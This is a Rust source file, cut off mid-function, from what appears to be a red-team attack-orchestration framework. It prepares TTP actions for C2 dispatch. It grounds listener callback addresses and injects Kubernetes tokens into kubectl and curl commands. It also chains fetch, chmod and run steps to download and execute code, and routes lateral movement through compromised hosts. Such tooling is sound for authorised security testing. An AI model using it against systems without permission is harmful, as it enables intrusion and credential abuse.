use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, Ordering};

use armory::{Armory, Procedure, Ttp};
use c2::{ExecTtp, OutputTransform, TtpExecuted, BUILTIN_C2_ID};
use ran_domain::{
    BinaryPresence, Entity, EntityId, K8sCluster, K8sCredential, K8sNode, K8sService, Listener,
    Merge, NameConfidence, OperatorHost, Pod, ServiceAccount, UnknownSystem,
};
use serde::Deserialize;
use serde_json::Value as JsonValue;

use crate::analyzers::{default_rules, UNKNOWN_NAMESPACE};
use crate::effects::{ground_template, parse_effect_with_status};
use crate::external_parser::SystemFieldUpdates;
use crate::failure_analyzers::{
    classify_failure, detect_failure_signature, FAILURE_ANALYZER_EFFECT_ID,
};
use crate::grounding::{
    detect_ungrounded_vars, ground_args_from_context, ground_entity_ref_vars, resolve_template,
};
use crate::output_parsers::{
    build_no_parser_audit, build_parse_audit, parse_incremental_output_effect, parse_output_effect,
};
use crate::rules::run_rules_fixpoint;
use crate::shell_cmd::ground_binaries;
use crate::{FactsUpdate, ParseResult};

use crate::execution_record::ExecutionRecord;
use crate::traversal::{CommandTraversal, TraversalHop};

use super::{
    Campaign, CampaignSystemEntityRef, ExecChannel, ExecuteActionError, ExecuteActionRequest,
    ExecuteActionResult, ExecutedActionEvent, TtpExecutionProcessing,
};

// ---------------------------------------------------------------------------
// Pipeline stage helpers (free functions)
// ---------------------------------------------------------------------------

fn validate_request(request: &ExecuteActionRequest) -> Result<(), ExecuteActionError> {
    if request.action_id.trim().is_empty() || request.target_id.trim().is_empty() {
        return Err(ExecuteActionError::InvalidInput(
            "actionId and targetId are required".to_string(),
        ));
    }
    if let Some(value) = request.args.get("__EXECUTION_TIMEOUT_SECONDS") {
        let valid = value
            .parse::<u64>()
            .is_ok_and(|seconds| (1..=3600).contains(&seconds));
        if !valid {
            return Err(ExecuteActionError::InvalidInput(
                "executionTimeoutSeconds must be between 1 and 3600".to_string(),
            ));
        }
    }
    Ok(())
}

fn resolve_ttp_and_defaults(
    action_id: &str,
    mut args: HashMap<String, String>,
    armory: &Armory,
) -> Result<(Ttp, HashMap<String, String>), ExecuteActionError> {
    let ttp = armory.get_ttp(action_id).cloned().ok_or_else(|| {
        ExecuteActionError::NotFound(format!("No TTP with ID '{}' found", action_id))
    })?;
    if ttp.status.eq_ignore_ascii_case("disabled") {
        return Err(ExecuteActionError::InvalidInput(format!(
            "TTP with ID '{}' is disabled",
            action_id
        )));
    }
    for p in &ttp.params {
        if !args.contains_key(&p.name) && !p.default.is_empty() {
            args.insert(p.name.clone(), p.default.clone());
        }
    }
    Ok((ttp, args))
}

/// Validate and normalize list-valued action parameters before template
/// rendering. The execution transport carries strings, so lists are encoded as
/// JSON precisely once at this boundary rather than interpolated as quoted
/// JSON into a Kubernetes manifest.
fn normalize_string_list_params(
    ttp: &Ttp,
    args: &mut HashMap<String, String>,
) -> Result<(), ExecuteActionError> {
    for param in &ttp.params {
        if param.param_type != "stringList" {
            continue;
        }
        let Some(value) = args.get(&param.name) else {
            continue;
        };
        let values = serde_json::from_str::<Vec<String>>(value).map_err(|_| {
            ExecuteActionError::InvalidInput(format!(
                "parameter '{}' must be a list of strings",
                param.name
            ))
        })?;
        let encoded = serde_json::to_string(&values).expect("strings always serialize to JSON");
        args.insert(param.name.clone(), encoded);
    }
    Ok(())
}

fn validate_option_params(
    ttp: &Ttp,
    args: &HashMap<String, String>,
) -> Result<(), ExecuteActionError> {
    for param in &ttp.params {
        if param.options.is_empty() {
            continue;
        }
        let Some(value) = args.get(&param.name) else {
            continue;
        };
        let invalid_value = if param.param_type == "stringList" {
            match serde_json::from_str::<Vec<String>>(value) {
                Ok(values) => values
                    .into_iter()
                    .find(|item| !param.options.contains(item)),
                Err(_) => Some(value.clone()),
            }
        } else if param.options.contains(value) {
            None
        } else {
            Some(value.clone())
        };
        if invalid_value.is_some() {
            return Err(ExecuteActionError::InvalidInput(format!(
                "parameter '{}' must be one of: {}",
                param.name,
                param.options.join(", ")
            )));
        }
    }
    Ok(())
}

/// Ground listener callback defaults from an explicitly selected Listener entity.
///
/// `${LISTENER}` means the single observed address of the OperatorHost that
/// contains the C2 hosting the selected listener. It deliberately never means
/// the listener entity ID. A listener only records its transport and port, and
/// selecting one of several host addresses would be a guess about the target's
/// return path, so ambiguous or missing address knowledge is rejected.
fn ground_listener_defaults(
    ttp: &Ttp,
    args: &mut HashMap<String, String>,
    campaign: &Campaign,
) -> Result<(), ExecuteActionError> {
    let host_placeholder = "${LISTENER}";
    let port_placeholder = "${LISTENER_PORT}";
    let host_default_referenced = listener_default_references(ttp, args, host_placeholder);
    let port_default_referenced = listener_default_references(ttp, args, port_placeholder);
    let host_needed = (ttp_references(ttp, host_placeholder)
        && listener_value_needs_default(args, "LISTENER", host_placeholder))
        || (host_default_referenced
            && listener_value_needs_default(args, "LISTENER", host_placeholder));
    let port_needed = (ttp_references(ttp, port_placeholder)
        && listener_value_needs_default(args, "LISTENER_PORT", port_placeholder))
        || (port_default_referenced
            && listener_value_needs_default(args, "LISTENER_PORT", port_placeholder));

    if !host_needed && !port_needed && !host_default_referenced && !port_default_referenced {
        return Ok(());
    }

    if !host_needed && !port_needed {
        return ground_listener_tokens_in_declared_defaults(ttp, args);
    }

    let listener_params: Vec<_> = ttp
        .params
        .iter()
        .filter(|param| param.param_type.eq_ignore_ascii_case("Listener"))
        .collect();
    if listener_params.len() != 1 {
        return Err(ExecuteActionError::InvalidInput(format!(
            "action '{}' uses ${{LISTENER}} or ${{LISTENER_PORT}} defaults and must declare exactly one Listener parameter",
            ttp.id
        )));
    }
    let selection_name = &listener_params[0].name;
    let selected_id = args
        .get(selection_name)
        .map(String::as_str)
        .map(str::trim)
        .filter(|value| !value.is_empty() && !value.starts_with("${"))
        .ok_or_else(|| {
            ExecuteActionError::InvalidInput(format!(
                "action '{}' needs a Listener selection in parameter '{}' to ground ${{LISTENER}} and ${{LISTENER_PORT}}",
                ttp.id, selection_name
            ))
        })?;
    let listener_id = EntityId::new(selected_id);
    let listener = campaign
        .entities
        .find::<Listener>(&listener_id)
        .ok_or_else(|| {
            ExecuteActionError::InvalidInput(format!(
                "Listener parameter '{}' must select an active Listener entity, got '{}'",
                selection_name, selected_id
            ))
        })?;

    let c2_ids = campaign.graph.sources_of(&listener_id, "hosts-listener");
    if c2_ids.len() != 1 {
        return Err(ExecuteActionError::InvalidInput(format!(
            "selected Listener '{}' is not hosted by exactly one active C2",
            selected_id
        )));
    }
    let listener_host = if host_needed {
        let operator_hosts: Vec<_> = campaign
            .graph
            .sources_of(c2_ids[0], "contains")
            .into_iter()
            .filter(|id| campaign.entities.find::<OperatorHost>(id).is_some())
            .collect();
        if operator_hosts.len() != 1 {
            return Err(ExecuteActionError::InvalidInput(format!(
                "cannot determine the operator host for selected Listener '{}'",
                selected_id
            )));
        }
        let host = campaign
            .entities
            .find::<OperatorHost>(operator_hosts[0])
            .expect("operator host was checked above");
        let mut addresses: Vec<String> = host.system.ips.iter().map(ToString::to_string).collect();
        addresses.sort();
        addresses.dedup();
        match addresses.as_slice() {
            [address] => Some(address.clone()),
            [] => {
                return Err(ExecuteActionError::InvalidInput(format!(
                    "cannot ground ${{LISTENER}} for selected Listener '{}': its C2 host has no reachable address recorded",
                    selected_id
                )));
            }
            _ => {
                return Err(ExecuteActionError::InvalidInput(format!(
                    "cannot ground ${{LISTENER}} for selected Listener '{}': its C2 host has multiple reachable addresses; provide an explicit LISTENER value",
                    selected_id
                )));
            }
        }
    } else {
        None
    };

    for (key, value) in args.iter_mut() {
        if host_needed
            && (value.trim() == host_placeholder
                || (key.eq_ignore_ascii_case("LISTENER") && value.trim().is_empty()))
        {
            *value = listener_host.clone().expect("host is resolved when needed");
        } else if port_needed
            && (value.trim() == port_placeholder
                || (key.eq_ignore_ascii_case("LISTENER_PORT") && value.trim().is_empty()))
        {
            *value = listener.port.to_string();
        }
    }
    if host_needed {
        args.insert(
            "LISTENER".to_string(),
            listener_host.expect("host is resolved when needed"),
        );
    }
    if port_needed {
        args.entry("LISTENER_PORT".to_string())
            .or_insert_with(|| listener.port.to_string());
    }
    ground_listener_tokens_in_declared_defaults(ttp, args)
}

fn ground_listener_tokens_in_declared_defaults(
    ttp: &Ttp,
    args: &mut HashMap<String, String>,
) -> Result<(), ExecuteActionError> {
    for param in &ttp.params {
        let is_declared_default = args
            .get(&param.name)
            .is_some_and(|value| value_matches_declared_default(param, value));
        if is_declared_default && param.default.contains("${LISTENER") {
            let value = args
                .get(&param.name)
                .expect("declared default was checked above")
                .clone();
            let grounded = ground_template(&value, args);
            if grounded.contains("${LISTENER}") || grounded.contains("${LISTENER_PORT}") {
                return Err(ExecuteActionError::InvalidInput(format!(
                    "action '{}' has unresolved listener defaults in parameter '{}'; select a Listener or provide concrete LISTENER and LISTENER_PORT values",
                    ttp.id, param.name
                )));
            }
            args.insert(param.name.clone(), grounded);
        }
    }
    Ok(())
}

fn listener_default_references(
    ttp: &Ttp,
    args: &HashMap<String, String>,
    placeholder: &str,
) -> bool {
    ttp.params.iter().any(|param| {
        param.default.contains(placeholder)
            && args
                .get(&param.name)
                .is_some_and(|value| value_matches_declared_default(param, value))
            && ttp_references_param(ttp, &param.name)
    })
}

/// A parameter can be interpolated either as `${NAME}` or as a Tera variable,
/// including a filtered expression such as `{{ Arguments | json_encode }}`.
fn ttp_references_param(ttp: &Ttp, name: &str) -> bool {
    let dollar_placeholder = format!("${{{}}}", name);
    let tera_with_space = format!("{{{{ {}", name);
    let tera_without_space = format!("{{{{{}", name);
    ttp.procedures.iter().any(|procedure| {
        procedure.command.contains(&dollar_placeholder)
            || procedure.command.contains(&tera_with_space)
            || procedure.command.contains(&tera_without_space)
    }) || ttp
        .effects
        .iter()
        .any(|effect| effect.contains(&dollar_placeholder))
}

fn value_matches_declared_default(param: &armory::TtpParam, value: &str) -> bool {
    if param.param_type != "stringList" {
        return value == param.default;
    }
    matches!(
        (
            serde_json::from_str::<Vec<String>>(value),
            serde_json::from_str::<Vec<String>>(&param.default),
        ),
        (Ok(value), Ok(default)) if value == default
    )
}

fn listener_value_needs_default(
    args: &HashMap<String, String>,
    key: &str,
    placeholder: &str,
) -> bool {
    args.get(key)
        .is_none_or(|value| value.trim().is_empty() || value.trim() == placeholder)
}

fn ttp_references(ttp: &Ttp, placeholder: &str) -> bool {
    ttp.procedures
        .iter()
        .any(|procedure| procedure.command.contains(placeholder))
        || ttp
            .effects
            .iter()
            .any(|effect| effect.contains(placeholder))
}

/// Normalise the caller-supplied `exec_system_id` hint.
///
/// Treats missing, whitespace-only, or "same as target" values as unspecified
/// so that channel resolution can apply its own logic without special-casing
/// the common UI default of echoing the target ID back.
fn normalise_exec_hint(exec_system_id: Option<&str>, target_id: &str) -> Option<String> {
    exec_system_id
        .map(str::trim)
        .filter(|s| !s.is_empty() && *s != target_id)
        .map(str::to_string)
}

#[derive(Debug, Clone)]
enum ResolvedK8sAuth {
    ServiceAccount {
        id: String,
        token: String,
    },
    Kubeconfig {
        id: String,
        /// The kubeconfig context this credential selects. Emitted as
        /// `--context` so kubectl targets the chosen identity rather than the
        /// file's current-context.
        context: Option<String>,
        /// Kubeconfig path in the source filesystem. `None` means the
        /// credential is available to Ran's local Kubernetes client.
        source_path: Option<String>,
        source_root: Option<String>,
    },
}

impl ResolvedK8sAuth {
    fn id(&self) -> &str {
        match self {
            Self::ServiceAccount { id, .. } | Self::Kubeconfig { id, .. } => id,
        }
    }

    fn kubectl_arg(&self) -> String {
        match self {
            Self::ServiceAccount { token, .. } => {
                format!("--token {}", shell_words::quote(token))
            }
            Self::Kubeconfig {
                context,
                source_path,
                ..
            } => {
                let mut arg = source_path
                    .as_deref()
                    .map(|path| format!("--kubeconfig {}", shell_words::quote(path)))
                    .unwrap_or_else(|| "--kubeconfig \"$KUBECONFIG\"".to_string());
                if let Some(context) = context.as_deref().filter(|c| !c.trim().is_empty()) {
                    arg.push_str(&format!(" --context {}", shell_words::quote(context)));
                }
                arg
            }
        }
    }

    fn token(&self) -> Option<&str> {
        match self {
            Self::ServiceAccount { token, .. } => Some(token),
            Self::Kubeconfig { .. } => None,
        }
    }

    fn uses_kubeconfig(&self) -> bool {
        matches!(self, Self::Kubeconfig { .. })
    }
}

/// Local C2-side control commands that should never require an exec channel.
fn is_local_control_command(cmd: &str) -> bool {
    let trimmed = cmd.trim_start();
    trimmed.starts_with("c2.kubectl_exec(")
        || trimmed.starts_with("c2.read_local_kubeconfig(")
        || trimmed == "noop"
}

/// Ground the procedure command and all TTP effects with the collected args.
///
/// Emits a structured warning for every variable that remains unresolved after
/// all passes (except `${CMD}`, which is intentionally preserved as the
/// hop-injection slot).
///
/// Also mints `PROCEDURE_CMD` in `args`: the command template grounded with all
/// args *except* CMD, so that effect handlers (e.g. `rce.can-exec`) can read
/// the full executed-command string from the args context.
fn ground_procedure_and_effects(
    procedure: &mut Procedure,
    effects: &mut [String],
    args: &mut HashMap<String, String>,
    ttp_id: &str,
) {
    let envelope_args: HashMap<_, _> = args
        .iter()
        .filter(|(k, _)| k.to_uppercase() != "CMD")
        .map(|(k, v)| (k.clone(), v.clone()))
        .collect();
    let envelope = ground_template(&procedure.command, &envelope_args);
    args.entry("PROCEDURE_CMD".to_string()).or_insert(envelope);

    procedure.command = ground_template(&procedure.command, args);
    if let Some(http_req) = procedure.http_request.as_mut() {
        ground_json_value(http_req, args);
    }
    if let Some(k8s_req) = procedure.k8s_request.as_mut() {
        ground_json_value(k8s_req, args);
    }
    if let Some(steps) = procedure.steps.as_mut() {
        ground_json_value(steps, args);
    }
    for effect in effects.iter_mut() {
        *effect = ground_template(effect, args);
    }

    for var in detect_ungrounded_vars(&procedure.command)
        .into_iter()
        .filter(|v| v != "CMD")
    {
        tracing::warn!(
            ttp_id,
            var,
            "ungrounded variable in procedure command - \
             check TTP params or target entity context"
        );
    }
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum BoolOrString {
    Bool(bool),
    Str(String),
}

impl BoolOrString {
    fn is_true(&self) -> bool {
        match self {
            BoolOrString::Bool(b) => *b,
            BoolOrString::Str(s) => s.trim().eq_ignore_ascii_case("true"),
        }
    }
}

impl Default for BoolOrString {
    fn default() -> Self {
        BoolOrString::Bool(true)
    }
}

#[derive(Debug, Deserialize)]
struct HttpRequestSpec {
    /// Explicitly marks an HTTP request whose bearer credentials come from
    /// the action's Authenticate As identity.
    #[serde(default)]
    authentication: String,
    url: String,
    #[serde(default = "default_http_method")]
    method: String,
    #[serde(default)]
    headers: HashMap<String, String>,
    #[serde(default)]
    body: String,
    #[serde(default = "default_timeout_seconds")]
    timeout_seconds: u64,
    #[serde(default)]
    use_ca: BoolOrString,
    #[serde(default)]
    ca_path: String,
    /// Save response body to this path; empty string means stdout.
    /// The alias `to` matches the `steps: [{fetch:}]` field name.
    #[serde(default, alias = "to")]
    output: String,
    #[serde(default)]
    follow_redirects: bool,
}

#[derive(Debug, Deserialize)]
struct KubernetesRequestSpec {
    authentication: String,
    api_server: String,
    api: String,
    resource: String,
    #[serde(default)]
    namespace: String,
    #[serde(default = "default_cluster_scoped")]
    cluster_scoped: BoolOrString,
    #[serde(default)]
    query: String,
    #[serde(default = "default_http_method")]
    method: String,
    #[serde(default)]
    use_ca: BoolOrString,
    #[serde(default)]
    ca_path: String,
    #[serde(default = "default_timeout_seconds")]
    timeout_seconds: u64,
}

fn validate_k8s_request_auth(
    procedure_id: &str,
    spec: &KubernetesRequestSpec,
) -> Result<(), ExecuteActionError> {
    if spec.authentication.trim().is_empty() {
        return Err(ExecuteActionError::InvalidInput(format!(
            "k8s_request procedure '{}' must declare authentication: ${{K8S_AUTH}}",
            procedure_id
        )));
    }
    Ok(())
}

fn build_k8s_resource_path(spec: &KubernetesRequestSpec) -> String {
    let api = spec.api.trim_matches('/');
    let resource = spec.resource.trim_matches('/');

    let base = format!("/{}", api);

    let resource_path = if spec.cluster_scoped.is_true() || spec.namespace.trim().is_empty() {
        format!("{}/{}", base, resource)
    } else {
        format!("{}/namespaces/{}/{}", base, spec.namespace.trim(), resource)
    };

    if spec.query.trim().is_empty() {
        resource_path
    } else {
        format!("{}?{}", resource_path, spec.query.trim())
    }
}

fn build_k8s_url(spec: &KubernetesRequestSpec) -> String {
    format!(
        "{}{}",
        spec.api_server.trim_end_matches('/'),
        build_k8s_resource_path(spec)
    )
}

/// Build a secret-free request line for native Kubernetes client executions.
/// Structured requests do not have a shell command, but the execution record
/// and flow drawer still need to show what was sent to the API server.
fn describe_k8s_request(
    procedure_id: &str,
    request: JsonValue,
) -> Result<String, ExecuteActionError> {
    let spec: KubernetesRequestSpec = serde_json::from_value(request).map_err(|e| {
        ExecuteActionError::InvalidInput(format!(
            "invalid k8s_request in procedure '{}': {}",
            procedure_id, e
        ))
    })?;
    validate_k8s_request_auth(procedure_id, &spec)?;
    let method = if spec.method.trim().is_empty() {
        "GET"
    } else {
        spec.method.trim()
    };
    Ok(format!(
        "{} {}",
        method.to_ascii_uppercase(),
        build_k8s_resource_path(&spec)
    ))
}

fn describe_authenticated_http_request(
    procedure_id: &str,
    request: JsonValue,
) -> Result<String, ExecuteActionError> {
    let spec: HttpRequestSpec = serde_json::from_value(request).map_err(|e| {
        ExecuteActionError::InvalidInput(format!(
            "invalid http_request in procedure '{}': {}",
            procedure_id, e
        ))
    })?;
    if spec.authentication.trim().is_empty() {
        return Err(ExecuteActionError::InvalidInput(format!(
            "Kubernetes http_request procedure '{}' must declare authentication: ${{K8S_AUTH}}",
            procedure_id
        )));
    }
    let method = if spec.method.trim().is_empty() {
        "GET"
    } else {
        spec.method.trim()
    };
    Ok(format!(
        "{} {}",
        method.to_ascii_uppercase(),
        spec.url.trim()
    ))
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum StepSpec {
    Fetch { fetch: Box<HttpRequestSpec> },
    Chmod { chmod: String },
    Run { run: String },
}

/// Recursively apply template grounding to all string values inside a JSON value.
pub(super) fn ground_json_value(val: &mut JsonValue, args: &HashMap<String, String>) {
    match val {
        JsonValue::String(s) => {
            *s = ground_template(&resolve_template(s, args), args);
        }
        JsonValue::Object(map) => {
            for v in map.values_mut() {
                ground_json_value(v, args);
            }
        }
        JsonValue::Array(arr) => {
            for v in arr.iter_mut() {
                ground_json_value(v, args);
            }
        }
        _ => {}
    }
}

fn default_http_method() -> String {
    "GET".to_string()
}

fn default_timeout_seconds() -> u64 {
    30
}

fn default_cluster_scoped() -> BoolOrString {
    BoolOrString::Bool(false)
}

/// Render an HTTP request command using the tool TTP identified by `tool_id`.
///
/// Maps `spec` fields to the tool TTP's parameter names, renders the Tera
/// template from the tool's first procedure, and returns the fully grounded
/// shell command.  Returns `None` when the tool is not found in the armory.
fn render_http_via_tool(spec: &HttpRequestSpec, tool_id: &str, armory: &Armory) -> Option<String> {
    let tool_ttp = armory.get_tool_ttp(tool_id)?;
    let tool_proc = tool_ttp.procedures.first()?;

    let headers_json = serde_json::to_string(&spec.headers).unwrap_or_else(|_| "{}".to_string());

    let mut args: HashMap<String, String> = HashMap::new();
    args.insert("URL".to_string(), spec.url.clone());
    args.insert(
        "METHOD".to_string(),
        if spec.method.trim().is_empty() {
            "GET".to_string()
        } else {
            spec.method.trim().to_string()
        },
    );
    args.insert("HEADERS".to_string(), headers_json);
    args.insert("PAYLOAD".to_string(), spec.body.clone());
    args.insert(
        "TIMEOUT".to_string(),
        spec.timeout_seconds.max(1).to_string(),
    );
    args.insert("USE_CA".to_string(), spec.use_ca.is_true().to_string());
    args.insert("CA_PATH".to_string(), spec.ca_path.clone());
    args.insert("OUTPUT".to_string(), spec.output.clone());
    args.insert(
        "FOLLOW_REDIRECTS".to_string(),
        spec.follow_redirects.to_string(),
    );

    let rendered = resolve_template(&tool_proc.command, &args);
    Some(ground_template(&rendered, &args))
}

fn materialize_steps(procedure: &mut Procedure, armory: &Armory) -> Result<(), ExecuteActionError> {
    let steps_value = match procedure.steps.take() {
        Some(v) => v,
        None => return Ok(()),
    };

    let steps: Vec<StepSpec> = serde_json::from_value(steps_value).map_err(|e| {
        ExecuteActionError::InvalidInput(format!(
            "invalid steps in procedure '{}': {}",
            procedure.id, e
        ))
    })?;

    if steps.is_empty() {
        return Err(ExecuteActionError::InvalidInput(format!(
            "invalid steps in procedure '{}': empty steps list",
            procedure.id
        )));
    }

    let tool_id = procedure.tool.as_deref().unwrap_or("curl");

    let mut parts: Vec<String> = Vec::with_capacity(steps.len());
    for step in steps {
        match step {
            StepSpec::Fetch { fetch } => {
                let cmd = render_http_via_tool(&fetch, tool_id, armory).ok_or_else(|| {
                    ExecuteActionError::InvalidInput(format!(
                        "tool '{}' not found for fetch step in procedure '{}'",
                        tool_id, procedure.id
                    ))
                })?;
                parts.push(cmd);
            }
            StepSpec::Chmod { chmod } => {
                parts.push(format!("chmod {}", chmod.trim()));
            }
            StepSpec::Run { run } => {
                parts.push(run.trim().to_string());
            }
        }
    }

    procedure.command = parts.join(" && ");
    Ok(())
}

pub(super) fn materialize_k8s_request(
    procedure: &mut Procedure,
    armory: &Armory,
    auth_token: Option<&str>,
) -> Result<(), ExecuteActionError> {
    let k8s_req_val = match procedure.k8s_request.take() {
        Some(v) => v,
        None => return Ok(()),
    };

    let spec: KubernetesRequestSpec = serde_json::from_value(k8s_req_val).map_err(|e| {
        ExecuteActionError::InvalidInput(format!(
            "invalid k8s_request in procedure '{}': {}",
            procedure.id, e
        ))
    })?;
    validate_k8s_request_auth(&procedure.id, &spec)?;

    let url = build_k8s_url(&spec);

    let mut headers = HashMap::new();
    headers.insert("Accept".to_string(), "application/json".to_string());
    if let Some(token) = auth_token.map(str::trim).filter(|token| !token.is_empty()) {
        headers.insert("Authorization".to_string(), format!("Bearer {token}"));
    }

    let http_spec = HttpRequestSpec {
        authentication: String::new(),
        url,
        method: if spec.method.trim().is_empty() {
            "GET".to_string()
        } else {
            spec.method.trim().to_string()
        },
        headers,
        body: String::new(),
        timeout_seconds: spec.timeout_seconds,
        use_ca: spec.use_ca,
        ca_path: spec.ca_path,
        output: String::new(),
        follow_redirects: false,
    };

    // `key: k8s-request` is a procedure selector used throughout the bundled
    // armory, not the ID of an HTTP rendering tool.
    let tool_id = procedure
        .tool
        .as_deref()
        .filter(|tool| *tool != "k8s-request")
        .unwrap_or("curl");

    procedure.command = render_http_via_tool(&http_spec, tool_id, armory).ok_or_else(|| {
        ExecuteActionError::InvalidInput(format!(
            "tool '{}' not found for k8s_request in procedure '{}'",
            tool_id, procedure.id
        ))
    })?;

    Ok(())
}

fn materialize_abstract_http_request(
    procedure: &mut Procedure,
    armory: &Armory,
    auth_token: Option<&str>,
) -> Result<(), ExecuteActionError> {
    let http_req_val = match procedure.http_request.take() {
        Some(v) => v,
        None => return Ok(()),
    };

    let mut spec: HttpRequestSpec = serde_json::from_value(http_req_val).map_err(|e| {
        ExecuteActionError::InvalidInput(format!(
            "invalid http_request in procedure '{}': {}",
            procedure.id, e
        ))
    })?;

    if !spec.authentication.trim().is_empty() {
        let token = auth_token.map(str::trim).filter(|token| !token.is_empty()).ok_or_else(|| {
            ExecuteActionError::InvalidInput(format!(
                "authenticated http_request procedure '{}' requires a ServiceAccount Authenticate As identity",
                procedure.id
            ))
        })?;
        if spec
            .headers
            .keys()
            .any(|name| name.eq_ignore_ascii_case("authorization"))
        {
            return Err(ExecuteActionError::InvalidInput(format!(
                "authenticated http_request procedure '{}' must not declare its own Authorization header",
                procedure.id
            )));
        }
        spec.headers
            .insert("Authorization".to_string(), format!("Bearer {token}"));
    }

    let tool_id = procedure.tool.as_deref().unwrap_or("curl");

    procedure.command = render_http_via_tool(&spec, tool_id, armory).ok_or_else(|| {
        ExecuteActionError::InvalidInput(format!(
            "tool '{}' not found for http_request in procedure '{}'",
            tool_id, procedure.id
        ))
    })?;

    Ok(())
}

/// Route a Lateral Movement action to the pre-resolved execution source.
///
/// Lateral Movement TTPs CREATE the exec edge to the victim rather than
/// requiring one to exist; they run FROM the compromised source.  The channel
/// was resolved (and `SRC` injected) in [`Campaign::resolve_lateral_src`]
/// before grounding so that effect strings like
/// `rce.can-exec(${SRC}, ${TARGET_ID})` are fully grounded.
///
/// Resolved execution routing: where a command runs, how its output must be
/// decoded, and - for multi-hop paths - the per-hop traversal breakdown.
struct ExecRoute {
    /// C2 backend id to dispatch through.
    backend_id: String,
    /// Semantic target entity id (attribution); always the request's target.
    target_id: String,
    /// Ordered physical execution hops from the C2 entry point to the target.
    exec_chain: Vec<String>,
    /// Output post-processing required before parsers run.
    output_transform: Option<OutputTransform>,
    /// Per-hop traversal breakdown for multi-hop routing, ordered from the C2
    /// entry point (outermost envelope) to the final target (innermost). Empty
    /// for direct/single-hop and local commands.
    traversal: Vec<TraversalHop>,
    /// Bare inner command on the final target, before any hop envelopes wrap
    /// it. Empty when there is no multi-hop traversal.
    inner_command: String,
}

/// Result of wrapping a command across intermediate hops.
struct HopWrap {
    /// Output post-processing required before parsers run.
    output_transform: Option<OutputTransform>,
    /// Per-hop traversal breakdown, outermost (C2) → innermost (target).
    traversal: Vec<TraversalHop>,
    /// Bare inner command on the final target, before any hop envelopes.
    inner_command: String,
}

impl ExecRoute {
    /// A direct/single-hop or local route with no per-hop traversal.
    fn direct(
        backend_id: String,
        target_id: String,
        exec_chain: Vec<String>,
        output_transform: Option<OutputTransform>,
    ) -> Self {
        Self {
            backend_id,
            target_id,
            exec_chain,
            output_transform,
            traversal: Vec::new(),
            inner_command: String::new(),
        }
    }
}

fn route_lateral_movement(
    lateral_src: Option<ExecChannel>,
    target_id: &str,
) -> Result<ExecRoute, ExecuteActionError> {
    let ch = lateral_src.ok_or_else(|| {
        ExecuteActionError::InvariantViolation(
            "lateral movement exec source should have been resolved before routing".to_string(),
        )
    })?;
    let exec_entity = ch
        .exec_target_id
        .clone()
        .unwrap_or_else(|| target_id.to_string());

    tracing::info!(
        target_id = %target_id,
        selected_source = %exec_entity,
        backend_id = %ch.backend_id,
        chain = %format_exec_chain(ch.backend_id.as_str(), &ch.hops, exec_entity.as_str()),
        "selected lateral-movement execution chain"
    );
    Ok(ExecRoute::direct(
        ch.backend_id,
        target_id.to_string(),
        vec![exec_entity.clone()],
        None,
    ))
}

fn current_time_millis() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

// ---------------------------------------------------------------------------
// Campaign impl - action preparation pipeline
// ---------------------------------------------------------------------------

impl Campaign {
    /// Prepare a TTP action for execution via a clean six-stage pipeline.
    ///
    /// ```text
    /// validate_request        - reject empty IDs immediately
    ///   → assert_target_exists  - target must be in the campaign
    ///   → resolve_ttp_and_defaults - TTP lookup + param default filling
    ///   → [delegate to prepare_action_with_ttp for stages 2-6]
    /// ```
    ///
    /// Each stage takes typed inputs and returns typed outputs; errors short-
    /// circuit via `?`.  `${SRC}` is injected exactly once (in
    /// `resolve_lateral_src`) so there is no risk of the two old injection sites
    /// conflicting.
    pub fn prepare_action(
        &mut self,
        mut request: ExecuteActionRequest,
        armory: &Armory,
    ) -> Result<ExecTtp, ExecuteActionError> {
        // Stage 1: validate inputs and look up static data.
        validate_request(&request)?;
        self.assert_target_exists(&request.target_id)?;
        let reasoning = request.reasoning.unwrap_or_default();
        let execution_timeout_seconds = request
            .args
            .remove("__EXECUTION_TIMEOUT_SECONDS")
            .and_then(|value| value.parse().ok())
            .unwrap_or(c2::DEFAULT_EXECUTION_TIMEOUT_SECONDS);
        let (ttp, args) = resolve_ttp_and_defaults(&request.action_id, request.args, armory)?;
        let mut exec = self.prepare_action_with_ttp(
            request.target_id,
            request.exec_system_id,
            request.auth_identity_id,
            request.procedure_id,
            ttp,
            args,
            armory,
        )?;
        exec.reasoning = reasoning;
        exec.execution_timeout_seconds = execution_timeout_seconds;
        Ok(exec)
    }

    /// Persist a failed execution attempt that never reached dispatch.
    ///
    /// Preparation can fail before an [`ExecTtp`] exists, so this records the
    /// original request and returns a TTP description suitable for the
    /// terminal campaign event published by the caller.
    pub fn record_preparation_failure(
        &mut self,
        request: &ExecuteActionRequest,
        armory: &Armory,
        error: &ExecuteActionError,
    ) -> (ExecutionRecord, Ttp) {
        let cmd_id = generate_cmd_id();
        let ttp = armory
            .get_ttp(&request.action_id)
            .cloned()
            .unwrap_or_else(|| Ttp::new(&request.action_id, &request.action_id, ""));
        let reason = match error {
            ExecuteActionError::InvalidInput(reason)
            | ExecuteActionError::NotFound(reason)
            | ExecuteActionError::NoExecChannel(reason)
            | ExecuteActionError::InvariantViolation(reason) => reason.clone(),
        };
        let mut normalized_request = request.clone();
        let parameter_identity = normalized_request
            .args
            .remove("K8S_AUTH")
            .filter(|identity| !identity.trim().is_empty());
        if normalized_request.auth_identity_id.is_none() {
            normalized_request.auth_identity_id = parameter_identity;
        }
        let record = ExecutionRecord::from_preparation_failure(
            cmd_id,
            &normalized_request,
            ttp.name.clone(),
            ttp.tactic.clone(),
            reason,
        );

        self.execution_records.push(record.clone());
        (record, ttp)
    }

    /// Internal pipeline: stages 2-6 of action preparation.
    ///
    /// Called by both `prepare_action` (normal attack steps) and
    /// `build_cleanup_actions` (synthesized cleanup TTPs).  Does NOT validate
    /// that the target entity is in the campaign - the caller is responsible
    /// for deciding whether to skip missing targets.
    #[allow(clippy::too_many_arguments)]
    pub(super) fn prepare_action_with_ttp(
        &mut self,
        target_id: String,
        exec_system_id: Option<String>,
        requested_auth_identity_id: Option<String>,
        procedure_id: Option<String>,
        mut ttp: Ttp,
        mut args: HashMap<String, String>,
        armory: &Armory,
    ) -> Result<ExecTtp, ExecuteActionError> {
        // Fill param defaults that weren't already in args.
        for p in &ttp.params {
            if !args.contains_key(&p.name) && !p.default.is_empty() {
